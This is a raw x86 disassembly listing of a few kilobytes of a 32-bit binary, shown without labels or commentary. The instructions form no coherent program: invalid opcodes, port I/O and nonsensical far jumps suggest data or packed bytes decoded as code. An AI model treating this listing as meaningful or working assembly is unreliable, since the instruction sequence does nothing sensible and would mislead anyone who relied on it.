  408ac3:	in     eax,dx
  408ac4:	xor    al,0x91
  408ac6:	inc    edx
  408ac7:	mov    edx,0x40bbaf10
  408acc:	icebp  
  408acd:	xchg   edi,eax
  408ace:	jecxz  0x408a67
  408ad0:	fs sbb al,0xc3
  408ad3:	mov    ebx,0x59766a8d
  408ad8:	clc    
  408ad9:	cmp    ebp,ecx
  408adb:	xor    cl,BYTE PTR [edx-0x6b]
  408ade:	mov    ch,0x77
  408ae0:	adc    BYTE PTR [ebp+0x16],bl
  408ae3:	scas   eax,DWORD PTR es:[edi]
  408ae4:	cld    
  408ae5:	inc    esp
  408ae6:	out    dx,eax
  408ae7:	mov    al,0x56
  408ae9:	push   ebp
  408aea:	dec    esi
  408aeb:	mov    ebp,0x6bce13d2
  408af0:	ret    
  408af1:	push   0x13
  408af3:	in     eax,0xbf
  408af5:	jne    0x408b6e
  408af7:	lahf   
  408af8:	(bad)  
  408afa:	pushf  
  408afb:	rcl    DWORD PTR [eax+0x5a],cl
  408afe:	imul   ecx,DWORD PTR [edi+eax*4-0x1abbdfbd],0xffffff99
  408b06:	mov    ebx,0xf9344bcd
  408b0b:	adc    DWORD PTR [ebx],0x58
  408b0e:	sub    ch,ch
  408b10:	icebp  
  408b11:	sbb    ch,bl
  408b13:	pop    ebx
  408b14:	out    dx,eax
  408b15:	jle    0x408b55
  408b17:	fcomp  st(4)
  408b19:	sub    eax,DWORD PTR [edx+0xf4a885e]
  408b1f:	jle    0x408b4c
  408b21:	jmp    0x6c27:0x6f727a0a
  408b28:	pop    ss
  408b29:	pop    eax
  408b2a:	fwait
  408b2b:	or     eax,0x91550b94
  408b30:	xlat   BYTE PTR ds:[ebx]
  408b31:	stos   BYTE PTR es:[edi],al
  408b32:	inc    esi
  408b33:	shl    BYTE PTR [edx-0x13],0x26
  408b37:	(bad)  
  408b39:	fist   WORD PTR [eax]
  408b3b:	leave  
  408b3c:	xor    DWORD PTR [ebx-0x3076b938],esi
  408b42:	or     BYTE PTR [ecx-0x5e],dl
  408b45:	scas   al,BYTE PTR es:[edi]
  408b46:	or     eax,0xa910183f
  408b4b:	nop
  408b4c:	int3   
  408b4d:	xor    eax,DWORD PTR [ebx+0x7587c20a]
  408b53:	inc    edi
  408b54:	mov    bl,0x49
  408b56:	in     eax,0xf2
  408b58:	ins    DWORD PTR es:[edi],dx
  408b59:	mov    cl,0xc1
  408b5b:	outs   dx,BYTE PTR ds:[esi]
  408b5c:	imul   ebp,DWORD PTR [esi],0x61
  408b5f:	cs out dx,eax
  408b61:	inc    eax
  408b62:	mov    ds,WORD PTR [esi]
  408b64:	xor    al,0xcf
  408b66:	adc    eax,ebx
  408b68:	into   
  408b69:	pop    edx
  408b6a:	les    ecx,FWORD PTR [ebp+0x23]
  408b6d:	add    DWORD PTR [esi+edi*2+0x3695b8d9],0xfffffff6
  408b75:	outs   dx,DWORD PTR ds:[esi]
  408b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b77:	mov    ah,cl
  408b79:	(bad)  
  408b7a:	xor    ch,BYTE PTR [ebx]
  408b7c:	inc    edi
  408b7d:	sub    BYTE PTR [ebx],bh
  408b7f:	xor    eax,0x2c24e144
  408b84:	mov    dh,ch
  408b86:	cmp    eax,0x7f298fd8
  408b8b:	push   edx
  408b8c:	mov    ch,0xba
  408b8e:	inc    eax
  408b8f:	pop    ecx
  408b90:	es cld 
  408b92:	sub    eax,0xc67f7800
  408b97:	or     BYTE PTR [esi-0x149e39a7],al
  408b9d:	push   ecx
  408b9e:	cmp    DWORD PTR [eax-0x21160ead],eax
  408ba4:	xor    ebp,DWORD PTR [edx]
  408ba6:	mov    bl,0x1c
  408ba8:	dec    esp
  408ba9:	mov    ebp,0x54b6d883
  408bae:	xchg   ebp,eax
  408baf:	ror    al,1
  408bb1:	jae    0x408b96
  408bb3:	test   al,0x47
  408bb5:	xor    al,0xf0
  408bb7:	sbb    edx,DWORD PTR [eax]
  408bb9:	imul   esi,DWORD PTR [ebp+0x7e7fa31a],0x408c02b6
  408bc3:	sti    
  408bc4:	out    dx,al
  408bc5:	mov    edi,0x20493bfd
  408bca:	retf   0xebf9
  408bcd:	dec    esp
  408bce:	and    ecx,DWORD PTR [ebx+0x42]
  408bd1:	cli    
  408bd2:	(bad)  
  408bd3:	out    dx,al
  408bd4:	pop    ecx
  408bd5:	rol    bl,0xb
  408bd8:	cmp    ebp,DWORD PTR [edx+0x5a]
  408bdb:	pushf  
  408bdc:	add    BYTE PTR [edi],dl
  408bde:	stc    
  408bdf:	idiv   ah
  408be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408be2:	cli    
  408be3:	sbb    edx,DWORD PTR [ebp+0x779f36f9]
  408be9:	jbe    0x408bf1
  408beb:	push   esi
  408bec:	jg     0x408c16
  408bee:	or     ah,bh
  408bf0:	mov    bl,0x19
  408bf2:	mov    WORD PTR [eax-0x65471dcc],?
  408bf8:	or     BYTE PTR [edi+0x2],dl
  408bfb:	lods   eax,DWORD PTR ds:[esi]
  408bfc:	cmp    esi,esi
  408bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bff:	inc    ebp
  408c00:	sahf   
  408c01:	js     0x408c78
  408c03:	dec    edx
  408c04:	sbb    eax,0x5a6e4faa
  408c09:	(bad)  
  408c0a:	sub    dh,BYTE PTR [edi]
  408c0c:	jg     0x408c4b
  408c0e:	ret    
  408c0f:	adc    edx,DWORD PTR [esi]
  408c11:	test   BYTE PTR [eax],0x23
  408c14:	push   edi
  408c15:	imul   ecx,DWORD PTR [ebx],0x4d5a1d1
  408c1b:	add    BYTE PTR [ebp+eax*4-0x20],dl
  408c1f:	cs sub ah,dh
  408c22:	(bad)  
  408c23:	pusha  
  408c24:	pusha  
  408c25:	fcomp  DWORD PTR [edi+0x58]
  408c28:	inc    edx
  408c29:	or     al,0x53
  408c2b:	stos   DWORD PTR es:[edi],eax
  408c2c:	adc    DWORD PTR [esi-0xe42ada8],0x47722028
  408c36:	test   al,0x3f
  408c38:	pop    ebx
  408c39:	inc    esp
  408c3b:	retf   0x696c
  408c3e:	icebp  
  408c3f:	loop   0x408bc9
  408c41:	rcl    DWORD PTR [ebx],1
  408c43:	mov    ah,0xb2
  408c45:	dec    esi
  408c46:	and    esi,DWORD PTR [edi]
  408c48:	mov    ebx,0x87b5bc7b
  408c4d:	jl     0x408c16
  408c4f:	les    edi,FWORD PTR [esi+0x1b887b2]
  408c55:	or     BYTE PTR [eax+0x611aa705],al
  408c5b:	xor    eax,0x5d5eef56
  408c60:	or     BYTE PTR [edx+0x14],ch
  408c63:	pop    edi
  408c64:	cs mov cl,0x4b
  408c67:	out    0x96,al
  408c69:	sbb    eax,0xa39c4694
  408c6e:	hlt    
  408c6f:	dec    ecx
  408c70:	mov    al,ds:0x4432c984
  408c75:	jmp    0x8edb:0x2d392100
  408c7c:	and    cl,cl
  408c7e:	dec    ebx
  408c7f:	mov    al,ds:0x29c78836
  408c84:	data16 aam 0xa9
  408c87:	jns    0x408c59
  408c89:	xchg   ebp,eax
  408c8a:	mov    eax,0x3afc69e
  408c8f:	jecxz  0x408d09
  408c91:	mov    ds:0x2ad6a092,eax
  408c96:	xor    cl,BYTE PTR [edi+0x2b]
  408c99:	mov    bh,0x4
  408c9b:	call   0x20f02567
  408ca0:	addr16 aam 0x20
  408ca3:	nop
  408ca4:	call   0x646d4d64
  408ca9:	popa   
  408caa:	popf   
  408cab:	add    edx,ebx
  408cad:	pop    ebp
  408cae:	cmp    eax,0x7071bd06
  408cb3:	mov    edx,0x7f88a704
  408cb8:	xor    eax,0xbede68fb
  408cbd:	mov    bl,0x89
  408cbf:	sahf   
  408cc0:	mov    ecx,0x7c569beb
  408cc5:	push   esp
  408cc6:	pop    ecx
  408cc7:	loope  0x408ce1
  408cc9:	gs mov dl,0x38
  408ccc:	add    edx,DWORD PTR [ecx]
  408cce:	mov    ah,0xc
  408cd0:	pop    eax
  408cd1:	and    DWORD PTR [ebx+eiz*1+0x59],esp
  408cd5:	mov    eax,DWORD PTR [edx+0x530a3a09]
  408cdb:	lds    ebx,FWORD PTR [ecx+eiz*8-0x284307bc]
  408ce2:	iret   
  408ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce4:	jbe    0x408cf2
  408ce6:	sub    bh,bh
  408ce8:	in     eax,0xdc
  408cea:	cs dec esi
  408cec:	cmc    
  408ced:	retf   0xbe52
  408cf0:	mov    fs,WORD PTR [ebx+0x3b]
  408cf3:	in     al,0xe0
  408cf5:	or     al,0x85
  408cf7:	bound  edi,QWORD PTR [ebx-0x5a]
  408cfa:	fs sub al,0x59
  408cfd:	fxtract 
  408cff:	adc    eax,0x92de3124
  408d04:	sbb    ebp,ebx
  408d06:	push   ebx
  408d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d08:	repnz shl BYTE PTR [ebp+0x60],cl
  408d0c:	sti    
  408d0d:	in     al,dx
  408d0e:	jo     0x408cfe
  408d10:	rcl    DWORD PTR [ecx],cl
  408d12:	inc    ebx
  408d13:	jmp    0x408cba
  408d15:	cmp    DWORD PTR [ecx+0x7e],esi
  408d18:	jnp    0x408d58
  408d1a:	test   eax,0x8a490cfe
  408d1f:	das    
  408d20:	idiv   BYTE PTR [edi]
  408d22:	pushf  
  408d23:	xchg   ebp,eax
  408d24:	xlat   BYTE PTR ds:[ebx]
  408d25:	mov    ch,0x45
  408d27:	dec    ecx
  408d28:	pusha  
  408d29:	je     0x408d7d
  408d2b:	scas   al,BYTE PTR es:[edi]
  408d2c:	ins    DWORD PTR es:[edi],dx
  408d2d:	cli    
  408d2e:	or     bl,BYTE PTR [edi]
  408d30:	jb     0x408d4f
  408d32:	xor    eax,DWORD PTR [esi+0x16]
  408d35:	das    
  408d36:	fwait
  408d37:	dec    eax
  408d38:	stos   BYTE PTR es:[edi],al
  408d39:	or     BYTE PTR [ecx],ch
  408d3b:	sbb    al,0xb1
  408d3d:	mov    ch,BYTE PTR [edi-0x1d328220]
  408d43:	stos   DWORD PTR es:[edi],eax
  408d44:	mov    bl,0x94
  408d46:	mov    eax,ds:0x62f9abb9
  408d4b:	popa   
  408d4c:	cmp    DWORD PTR [eax+0x3d],esi
  408d4f:	jg     0x408dcd
  408d51:	fwait
  408d52:	jb     0x408cec
  408d54:	test   eax,0x6a211daa
  408d59:	jle    0x408d13
  408d5b:	inc    esi
  408d5c:	icebp  
  408d5d:	jmp    0x5771:0x5e28fcbb
  408d64:	in     al,dx
  408d65:	pop    ebx
  408d66:	retfw  0xd61
  408d6a:	fdiv   QWORD PTR [edx-0x41]
  408d6d:	popa   
  408d6e:	push   ds
  408d6f:	mov    ecx,0x774e1d6
  408d74:	fist   DWORD PTR [ebp+0x6c]
  408d77:	outs   dx,DWORD PTR ds:[esi]
  408d78:	scas   al,BYTE PTR es:[edi]
  408d79:	in     eax,0x95
  408d7b:	push   ecx
  408d7c:	stos   BYTE PTR es:[edi],al
  408d7d:	out    dx,al
  408d7e:	gs adc al,0x8e
  408d81:	inc    ebx
  408d82:	push   edx
  408d83:	mov    edi,0x2b8766b5
  408d88:	les    si,DWORD PTR [ebx+0xb]
  408d8c:	cwde   
  408d8d:	mov    al,ds:0x4cb5147c
  408d92:	and    ch,BYTE PTR [ebx+0x6f]
  408d95:	push   0x80b5d8c1
  408d9a:	push   es
  408d9b:	cmp    eax,0xa5f32153
  408da0:	push   esp
  408da1:	mov    al,0x2e
  408da3:	iret   
  408da4:	pop    ebp
  408da5:	(bad)  
  408da6:	or     ebx,DWORD PTR [ecx-0x75b698f2]
  408dac:	jnp    0x408d71
  408dae:	pop    ebp
  408daf:	fdivr  DWORD PTR [ecx+0x7d]
  408db2:	jmp    0x8954:0x82dba3a9
  408db9:	sbb    al,0x40
  408dbb:	daa    
  408dbc:	add    ebx,DWORD PTR [ecx+0x7b]
  408dbf:	pop    ecx
  408dc0:	mov    cl,0x84
  408dc2:	je     0x408db4
  408dc4:	sub    esi,DWORD PTR [ebp+0x6fbcfc3b]
  408dca:	pop    ds
  408dcb:	jecxz  0x408e00
  408dcd:	jle    0x408e33
  408dcf:	es jb  0x408e2b
  408dd2:	std    
  408dd3:	push   eax
  408dd4:	les    ebp,FWORD PTR [eax]
  408dd6:	mov    eax,DWORD PTR [esi+0x1a613c33]
  408ddc:	out    dx,eax
  408ddd:	push   cs
  408dde:	dec    esp
  408ddf:	add    al,0xfc
  408de1:	nop
  408de2:	pop    ebx
  408de3:	lods   al,BYTE PTR ds:[esi]
  408de4:	xchg   esi,eax
  408de5:	imul   edx,ebp,0x4f38f597
  408deb:	call   0x6ee7:0xdfa0e74c
  408df2:	push   cs
  408df3:	inc    esi
  408df4:	push   ecx
  408df5:	push   0xffffffa8
  408df7:	sbb    eax,0xe42bde6c
  408dfc:	sub    ecx,DWORD PTR [edi]
  408dfe:	cmp    eax,0x68a21ae8
  408e03:	ins    DWORD PTR es:[edi],dx
  408e04:	cdq    
  408e05:	xchg   esi,esp
  408e07:	inc    ebx
  408e08:	stos   BYTE PTR es:[edi],al
  408e09:	nop
  408e0a:	jae    0x408dac
  408e0c:	pop    ds
  408e0d:	adc    bh,0x4f
  408e10:	mov    WORD PTR ds:0x46e50238,fs
  408e16:	loope  0x408dbc
  408e18:	stc    
  408e19:	imul   esp,DWORD PTR [ebx],0xf0788f29
  408e1f:	mov    eax,0x8270134b
  408e24:	cmc    
  408e25:	jmp    0x7269e601
  408e2a:	pusha  
  408e2b:	and    bh,BYTE PTR [eax+0x45]
  408e2e:	add    bh,dl
  408e30:	fnstsw WORD PTR [edx]
  408e32:	mov    edi,0xdd48c93e
  408e37:	bnd jle 0x408e63
  408e3a:	jecxz  0x408ea3
  408e3c:	pop    ebp
  408e3d:	sbb    DWORD PTR [edx+ebx*1+0x1c],0x80ba01f3
  408e45:	aam    0xf7
  408e47:	sub    BYTE PTR [edi],dh
  408e49:	scas   eax,DWORD PTR es:[edi]
  408e4a:	aad    0xee
  408e4c:	enter  0xf6e,0x82
  408e50:	rcr    BYTE PTR [ebx],cl
  408e52:	inc    ebx
  408e53:	xlat   BYTE PTR ds:[ebx]
  408e54:	jne    0x408e6e
  408e56:	or     edi,DWORD PTR [esi+0x3e]
  408e59:	(bad)  
  408e5a:	aad    0x95
  408e5c:	adc    eax,0x2fa566be
  408e61:	mov    bl,0x7a
  408e63:	neg    DWORD PTR [ebx-0x4f]
  408e66:	jmp    0x44c4:0xf84188ad
  408e6d:	and    DWORD PTR cs:[esi+0x50],ebp
  408e71:	mov    cl,0x84
  408e73:	retf   
  408e74:	push   ds
  408e75:	cmp    esi,DWORD PTR [ecx+edi*1]
  408e78:	push   0xadca5b3d
  408e7d:	mov    ds:0x895a4a2e,al
  408e82:	mov    eax,0x61240387
  408e87:	sbb    ebx,0x1c
  408e8a:	sub    dh,ah
  408e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e8d:	push   edi
  408e8e:	push   es
  408e8f:	push   eax
  408e90:	dec    esi
  408e91:	jae    0x408ec4
  408e93:	ds icebp 
  408e95:	and    al,0xd
  408e97:	bnd jl 0x408ed1
  408e9a:	mov    ecx,0x26a27dd
  408e9f:	pop    esp
  408ea0:	sbb    eax,0xc1921ca8
  408ea5:	jnp    0x408e68
  408ea7:	fdiv   QWORD PTR [ebx-0x5e]
  408eaa:	or     edi,edx
  408eac:	xor    BYTE PTR [esi+0xc],0xf9
  408eb0:	cld    
  408eb1:	std    
  408eb2:	add    bh,BYTE PTR ds:0x1977f541
  408eb8:	jno    0x408e6d
  408eba:	sub    eax,0x9b0b4738
  408ebf:	lock cmc 
  408ec1:	xor    DWORD PTR [ebp+0x2c],0xffffff86
  408ec5:	xchg   BYTE PTR [edi],ch
  408ec7:	and    bl,BYTE PTR [ecx]
  408ec9:	xchg   ebp,eax
  408eca:	push   ebp
  408ecb:	push   edi
  408ecc:	sbb    DWORD PTR [edx],0x60
  408ecf:	pusha  
  408ed0:	adc    BYTE PTR [ecx+0x1dffa918],cl
  408ed6:	push   edx
  408ed7:	dec    esp
  408ed8:	push   edi
  408ed9:	(bad)  
  408eda:	jle    0x408f2d
  408edc:	shl    esp,0xb8
  408edf:	jae    0x408e76
  408ee1:	test   BYTE PTR ds:0xe8dfd7da,ch
  408ee7:	xor    al,0x89
  408ee9:	sbb    eax,0x3902a2c7
  408eee:	into   
  408eef:	push   esp
  408ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ef1:	loop   0x408ec8
  408ef3:	test   al,0x5b
  408ef6:	nop
  408ef7:	sbb    dl,BYTE PTR [edx+0x134092e]
  408efd:	mov    ch,BYTE PTR [ebp-0x9a2b044]
  408f03:	and    DWORD PTR [edx-0xe],0x6404980f
  408f0a:	mov    al,0x2b
  408f0c:	inc    edx
  408f0d:	mov    ds:0x17577155,al
  408f12:	je     0x408f1e
  408f14:	cmc    
  408f15:	xchg   BYTE PTR [eax+0x66],ch
  408f18:	sti    
  408f19:	xchg   BYTE PTR [edi-0x58c36e7],dl
  408f1f:	mov    al,0x7b
  408f21:	mov    esp,0xdef1c165
  408f26:	jo     0x408f16
  408f28:	add    al,BYTE PTR [edx+ecx*8+0x7e]
  408f2c:	mov    edi,0x18576115
  408f31:	jne    0x408f13
  408f33:	inc    ebp
  408f34:	and    edx,ecx
  408f36:	loop   0x408f69
  408f38:	adc    BYTE PTR [eax+0x1],dh
  408f3b:	xchg   dl,cl
  408f3d:	or     al,0x9c
  408f3f:	or     al,0xdd
  408f41:	sbb    DWORD PTR [eax-0x30],ecx
  408f44:	mov    ds:0xd2bc84f9,al
  408f49:	ret    
  408f4a:	push   ss
  408f4b:	sub    BYTE PTR [edi+esi*4-0x5bf2850a],cl
  408f52:	xlat   BYTE PTR ds:[ebx]
  408f53:	push   eax
  408f54:	jnp    0x408eda
  408f56:	in     al,dx
  408f57:	sbb    dl,bh
  408f59:	sar    BYTE PTR [edi-0x6d],0x34
  408f5d:	pushf  
  408f5e:	and    DWORD PTR [ebp-0x414a9dd2],0xffffff8a
  408f65:	dec    eax
  408f66:	ret    
  408f67:	cmp    al,0xdf
  408f69:	in     al,dx
  408f6a:	xchg   ebx,eax
  408f6b:	jl     0x408fe5
  408f6d:	dec    ecx
  408f6e:	dec    ebx
  408f6f:	xchg   ebx,eax
  408f70:	aaa    
  408f71:	mov    cl,0xc0
  408f73:	sahf   
  408f74:	enter  0xf0bb,0xb7
  408f78:	pop    esp
  408f79:	dec    esp
  408f7a:	adc    al,0x32
  408f7c:	imul   edi,DWORD PTR [ebp-0x1],0x6a38db91
  408f83:	sub    BYTE PTR [ebx-0x45df5913],cl
  408f89:	imul   ebp,DWORD PTR [ebx+0x8bb6125],0xffffffa4
  408f90:	aad    0x3e
  408f92:	cli    
  408f93:	test   al,0x64
  408f95:	out    0xb3,al
  408f97:	arpl   WORD PTR [eax+0x3d6430e9],bp
  408f9d:	xor    edx,ecx
  408f9f:	push   edx
  408fa0:	pop    ss
  408fa1:	and    al,0xac
  408fa3:	cmp    al,0x95
  408fa5:	jmp    0x40d60dae
  408faa:	push   esp
  408fab:	jnp    0x409024
  408fad:	scas   eax,DWORD PTR es:[edi]
  408fae:	in     eax,dx
  408faf:	push   esi
  408fb0:	cmp    dh,BYTE PTR [esi]
  408fb2:	sbb    al,0x76
  408fb4:	xor    BYTE PTR [esi],ah
  408fb6:	loopne 0x408f56
  408fb8:	mov    ss,WORD PTR [edi-0x339516f4]
  408fbe:	ss leave 
  408fc0:	mov    cs,eax
  408fc2:	shr    DWORD PTR [edx],1
  408fc4:	jnp    0x408fd3
  408fc6:	pop    ebp
  408fc7:	xlat   BYTE PTR ds:[ebx]
  408fc8:	xor    eax,ebx
  408fca:	or     BYTE PTR [edx],bh
  408fcc:	xchg   ecx,eax
  408fcd:	add    edi,DWORD PTR [ecx+0x5a]
  408fd0:	xchg   ecx,eax
  408fd1:	in     eax,dx
  408fd2:	jecxz  0x409010
  408fd4:	cs in  al,0x5a
  408fd7:	adc    bh,BYTE PTR [eax-0x11b4d726]
  408fdd:	jle    0x408fd1
  408fdf:	shl    ebp,cl
  408fe1:	das    
  408fe2:	xchg   esi,eax
  408fe3:	mov    al,ds:0xfe5f686
  408fe8:	pop    esp
  408fe9:	dec    ecx
  408fea:	xchg   esp,eax
  408feb:	mov    edi,0x819a8db5
  408ff0:	push   edx
  408ff1:	inc    edx
  408ff2:	push   edi
  408ff3:	inc    esp
  408ff4:	mov    dh,BYTE PTR [eax-0x770f14c6]
  408ffa:	out    dx,al
  408ffb:	jbe    0x408ffb
  408ffd:	mov    dh,0x77
  408fff:	sub    dh,dl
  409001:	inc    esp
  409002:	xor    al,al
  409004:	mov    al,0x9f
  409006:	or     eax,0xe51b370b
  40900b:	idiv   DWORD PTR [bx+di+0x4cd3]
  409010:	pop    esi
  409011:	(bad)  
  409012:	mov    dl,0x9b
  409014:	cmp    ebp,DWORD PTR [esi]
  409016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409017:	loopne 0x40901e
  409019:	jo     0x408fff
  40901b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40901c:	add    edx,DWORD PTR fs:[esi]
  40901f:	cld    
  409020:	cli    
  409021:	scas   eax,DWORD PTR es:[edi]
  409022:	cld    
  409023:	daa    
  409024:	retf   0xa252
  409027:	shl    bh,1
  409029:	retf   
  40902a:	mov    ecx,0xf45e00dc
  40902f:	push   es
  409030:	cmp    cl,BYTE PTR [edi+0x29]
  409033:	push   ss
  409034:	shl    esp,cl
  409036:	jnp    0x409050
  409038:	arpl   bx,bp
  40903a:	fwait
  40903b:	(bad)  
  40903d:	push   edi
  40903e:	mov    edx,0xa0d612c7
  409043:	mov    edi,0xe7ec95ba
  409048:	imul   ebx,esp,0xd47df5ff
  40904e:	or     esp,DWORD PTR [esi-0x64]
  409051:	repnz stos DWORD PTR es:[edi],eax
  409053:	and    edx,ecx
  409055:	fwait
  409056:	in     al,dx
  409057:	fs shl ch,0x5d
  40905b:	mov    edx,0x5709ad37
  409060:	mov    esi,0xa4579ad1
  409065:	out    0xb5,eax
  409067:	ja     0x409011
  409069:	push   cs
  40906a:	sub    BYTE PTR [eax+eiz*1+0x65656857],dh
  409071:	sbb    BYTE PTR [edx+0x6],al
  409074:	adc    ch,bh
  409076:	or     ah,BYTE PTR es:[ebp-0x309fa802]
  40907d:	mov    ds:0xeae69bc8,al
  409082:	fisub  DWORD PTR [eax-0x337fea2d]
  409088:	mov    ebx,DWORD PTR [ebp+0x64253920]
  40908e:	int3   
  40908f:	mov    ebp,edi
  409091:	and    al,0xb6
  409093:	ins    DWORD PTR es:[edi],dx
  409094:	shl    bl,cl
  409096:	sub    DWORD PTR [ebx+0x9],eax
  409099:	fistp  WORD PTR [eax+0x79]
  40909c:	or     al,0x29
  40909e:	dec    esi
  40909f:	sti    
  4090a0:	and    al,0xad
  4090a2:	cwde   
  4090a3:	mov    WORD PTR [edi-0x15],fs
  4090a6:	sbb    DWORD PTR [edi],0xe4455301
  4090ac:	fsub   DWORD PTR [esi+0x10c61ad1]
  4090b2:	sbb    dh,BYTE PTR [ebx-0x2]
  4090b5:	call   0xa8f7:0x5fc3d90c
  4090bc:	mov    ecx,0x75e76d8d
  4090c1:	sub    eax,0x252665d3
  4090c6:	push   ss
  4090c7:	mov    eax,ds:0x9c29e73e
  4090cc:	sub    bh,BYTE PTR es:[ecx+0xf]
  4090d0:	dec    esi
  4090d1:	dec    esp
  4090d2:	mov    dl,0xf1
  4090d4:	mov    ebp,0x7ff4940b
  4090d9:	jp     0x4090f1
  4090db:	bound  eax,QWORD PTR [eax+0x38]
  4090de:	repnz mov ds:0xa13c590,al
  4090e4:	mov    edx,0x266b7bc4
  4090e9:	out    0xf1,eax
  4090eb:	js     0x409166
  4090ed:	and    BYTE PTR ds:0x55c0f369,dl
  4090f3:	fiadd  WORD PTR [edi+0x4f13f874]
  4090f9:	retf   
  4090fa:	sahf   
  4090fb:	(bad)  
  4090fc:	out    0x41,al
  4090fe:	mov    esp,0x2615e6eb
  409103:	pop    ds
  409104:	lods   al,BYTE PTR ds:[esi]
  409105:	fucomp st(3)
  409107:	dec    ebp
  409108:	in     eax,0xfb
  40910a:	or     eax,0xbbf03a18
  40910f:	mov    DWORD PTR [ebx],esp
  409111:	xor    BYTE PTR [edi],0x25
  409114:	mov    DWORD PTR [edx+0x64],ecx
  409117:	adc    ebp,DWORD PTR [esi+ebp*1]
  40911a:	mov    DWORD PTR [ecx+0x47],0xbad3d1ef
  409121:	and    al,0xed
  409123:	jp     0x4090b5
  409125:	cli    
  409126:	inc    esp
  409127:	ret    
  409128:	(bad)  
  409129:	dec    esp
  40912a:	push   edx
  40912b:	not    DWORD PTR [esi]
  40912d:	cmc    
  40912e:	shl    BYTE PTR ds:0x3ae23d61,cl
  409134:	mov    edx,0x561a7a07
  409139:	dec    edi
  40913a:	mov    dl,0xcd
  40913c:	loopne 0x40912e
  40913e:	jle    0x4090e5
  409140:	inc    ebx
  409141:	cwde   
  409142:	and    bh,bl
  409144:	sub    BYTE PTR [edx-0x6e],ch
  409147:	inc    edx
  409148:	ds jbe 0x409119
  40914b:	into   
  40914c:	aad    0x4c
  40914e:	out    dx,al
  40914f:	xchg   BYTE PTR ds:0x28c95a8b,dh
  409155:	out    dx,eax
  409156:	xchg   ebp,eax
  409157:	sub    BYTE PTR [eax-0x14],dl
  40915a:	xchg   ecx,eax
  40915b:	or     BYTE PTR [ebp-0x23],ch
  40915e:	pop    ebx
  40915f:	test   al,0x22
  409161:	cmp    BYTE PTR [ebp+0x11fcf8e1],dl
  409167:	jmp    FWORD PTR [edi+0x6c46fb5b]
  40916d:	mov    DWORD PTR [eax+0x7a],0xa4b6343e
  409174:	(bad)  
  409175:	jl     0x409197
  409177:	jge    0x4091c8
  409179:	push   0x1a87d1d9
  40917e:	inc    esi
  40917f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409180:	repnz sbb DWORD PTR [ebx-0xff69fc2],ebx
  409187:	(bad)  
  409188:	test   BYTE PTR [ecx-0x2f],0x6d
  40918c:	add    ebx,esp
  40918e:	xchg   DWORD PTR [ebx],edi
  409190:	lods   eax,DWORD PTR ds:[esi]
  409191:	xchg   ebp,eax
  409192:	push   0x0
  409194:	shl    DWORD PTR [edx-0x130dd379],cl
  40919a:	stos   BYTE PTR es:[edi],al
  40919b:	into   
  40919c:	sbb    BYTE PTR [esi],dl
  40919e:	sti    
  40919f:	cmp    ebx,ebp
  4091a1:	push   ebx
  4091a2:	bound  ebx,QWORD PTR [eax]
  4091a4:	out    0x13,al
  4091a6:	aaa    
  4091a7:	xchg   ebx,eax
  4091a8:	icebp  
  4091a9:	out    0x1a,eax
  4091ab:	jg     0x4091f2
  4091ad:	jmp    0xafdb:0xdf2b248f
  4091b4:	push   cs
  4091b5:	jno    0x4091ec
  4091b7:	lods   eax,DWORD PTR ds:[esi]
  4091b8:	jmp    0xdafe:0xcbe13197
  4091bf:	push   edx
  4091c0:	push   0xffffffc3
  4091c2:	or     esp,DWORD PTR ds:0x3a2d01c1
  4091c8:	mov    eax,ds:0xc25b17a2
  4091cd:	inc    esp
  4091ce:	ffree  st(0)
  4091d0:	adc    al,0x72
  4091d2:	adc    eax,0x9f7b14ce
  4091d7:	sti    
  4091d8:	fidivr DWORD PTR [ebx-0x7a4c006a]
  4091de:	xor    dh,0x1b
  4091e1:	int    0xc3
  4091e3:	scas   al,BYTE PTR es:[edi]
  4091e4:	cs not ebx
  4091e7:	xchg   edi,eax
  4091e8:	sub    bh,BYTE PTR [edi-0x5b]
  4091eb:	adc    BYTE PTR ds:0x3779550d,cl
  4091f1:	out    0x0,eax
  4091f3:	stc    
  4091f4:	int    0xba
  4091f6:	or     dl,ch
  4091f8:	cmp    ah,BYTE PTR [edi-0x54615033]
  4091fe:	mov    BYTE PTR [eax],ch
  409200:	das    
  409201:	in     al,0xa
  409203:	jae    0x409186
  409205:	pop    eax
  409206:	adc    al,0x52
  409208:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40920a:	mov    cl,0x95
  40920c:	xor    eax,DWORD PTR [edx+0x732d5771]
  409212:	pop    es
  409213:	sbb    dh,BYTE PTR [edx+0x3e]
  409216:	cld    
  409217:	shl    BYTE PTR [esi+0x2d],0x69
  40921b:	adc    eax,0x81ddbffe
  409220:	outs   dx,DWORD PTR ds:[esi]
  409221:	add    DWORD PTR [edi+0x42],ebp
  409224:	inc    esp
  409225:	mov    edx,DWORD PTR [edi+0x1736c383]
  40922b:	nop
  40922c:	in     eax,dx
  40922d:	jg     0x4091c6
  40922f:	lods   eax,DWORD PTR ds:[esi]
  409230:	cs lock mov esp,0x29f81c51
  409237:	mov    ebp,0x33dc065d
  40923c:	jle    0x4091be
  40923e:	xchg   edi,eax
  40923f:	cmp    esp,ebp
  409241:	adc    BYTE PTR [ebp-0x4f],cl
  409244:	mov    eax,0x73fdc465
  409249:	jbe    0x409214
  40924b:	mov    BYTE PTR [edi-0x7366f7df],al
  409251:	lock push eax
  409253:	cmp    eax,0x1556a4c4
  409258:	adc    BYTE PTR [eax+0x1c],dl
  40925b:	pop    edi
  40925c:	adc    DWORD PTR [ebx-0x28],esi
  40925f:	scas   al,BYTE PTR es:[edi]
  409260:	into   
  409261:	cmc    
  409262:	ret    
  409263:	enter  0xd8b,0xb2
  409267:	push   ecx
  409268:	mov    fs,WORD PTR [esi+0x6b12710]
  40926e:	out    0x1d,eax
  409270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409271:	pop    esp
  409272:	pop    ss
  409273:	cmp    al,0xf9
  409276:	cmp    BYTE PTR [ecx-0x34080fc6],cl
